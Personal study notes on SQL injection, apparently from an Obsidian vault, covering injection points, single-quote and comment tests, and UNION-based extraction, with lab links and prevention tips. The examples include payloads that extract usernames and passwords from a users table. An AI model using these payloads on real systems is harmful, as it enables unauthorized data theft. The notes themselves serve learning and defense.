#Red 
1. **Basic SQL Injection**
     - Identifying injection points
     - Basic UNION-based SQL Injection
2. **Error-based SQL Injection**
     - Leveraging database error messages
3. **Union-based SQL Injection**
     - Using the UNION operator to extract data   
4. **Blind SQL Injection**
     - Time-based Blind SQL Injection
     - Boolean-based Blind SQL Injection
5. **Out-of-Band SQL Injection**
     - Using [[DNS]] and HTTP requests to exfiltrate data
## Basic SQL Injection

### 1. Identifying Injection Points

#### Common Injection Points
1. **User Input Fields**:
   - Login forms
   - Search fields
   - Registration forms
   - Contact forms

2. **URL Parameters**:
   - Query strings (e.g., `example.com/products?id=1`)

3. **Cookies**:
   - User information stored in cookies

4. **HTTP Headers**:
   - User-Agent, Referer, etc.

5. **API Endpoints**:
   - [[API#REST API|RESTful]] and [[API#SOAP API|SOAP API]] parameters

#### Techniques to Identify Injection Points

1. **Single Quote Test**:
- Enter a single quote (`'`) in input fields or URL parameters.
- If an error occurs (e.g., `SQL syntax error`), it indicates a potential injection point.
- Example:
```
Login Username: admin'
```
- SQL Query:
```sql
SELECT * FROM users WHERE username = 'admin'';
```

2. **Comment Injection Test**:
- Use SQL comments (`--`, `#`) to bypass parts of the query.
- Example:
```
Login Username: admin' -- 
```
- SQL Query:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'password';
```

1. **Error-Based Testing**:
- Inject known bad inputs and look for database error messages.
- Example:
```
Product ID: 1'
```
- SQL Query:
```sql
SELECT * FROM products WHERE id = 1';
```
- Possible error message:
```
SQL syntax error near '1''
```

#### Practice Labs
- [[Portswigger Labs#**SQL Injection 1** |Lab]]: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### 2. Basic UNION-Based SQL Injection

#### Understanding the UNION Operator
- The `UNION` operator is used in SQL to combine the results of two or more SELECT statements.
- Each SELECT statement within the UNION must have the same number of columns in the result sets with similar data types.

#### Steps to Perform UNION-Based SQL Injection

1. **Determine the Number of Columns**:
- Inject a UNION SELECT statement with NULL values to identify the number of columns.
- Example:
```
Product ID: 1 UNION SELECT NULL, NULL, NULL
```
- SQL Query:
```sql
SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT NULL, NULL, NULL;
```
- Adjust the number of `NULL` values until no error is returned.

2. **Find Data Types**:
- Replace NULL with values matching the data type of each column.
- Example:
```
Product ID: 1 UNION SELECT 1, 'string', NULL
```

1. **Extract Data**:
- Once the number of columns and their data types are known, extract data from another table.
- Example:
```
Product ID: 1 UNION SELECT username, password, NULL FROM users
```
- SQL Query:
```sql
SELECT column1, column2, column3 FROM products WHERE id = 1 UNION SELECT username, password, NULL FROM users;
```

#### Example Injection
Given a vulnerable query:
```sql
SELECT id, name, price FROM products WHERE id = '1';
```
Performing a UNION-based injection:
```
Input: 1 UNION SELECT username, password, '0' FROM users
```
Injected Query:
```sql
SELECT id, name, price FROM products WHERE id = '1' UNION SELECT username, password, '0' FROM users;
```

#### Portswigger Labs


### Prevention Techniques
- **Parameterized Queries (Prepared Statements)**:
  - Ensures user inputs are treated as data, not executable code.
- **Stored Procedures**:
  - Encapsulate [[SQL]] code, reducing the risk of injection.
- **Input Validation**:
  - Validate and sanitize all user inputs.
- **Least Privilege**:
  - Limit database user privileges to reduce the impact of a successful injection.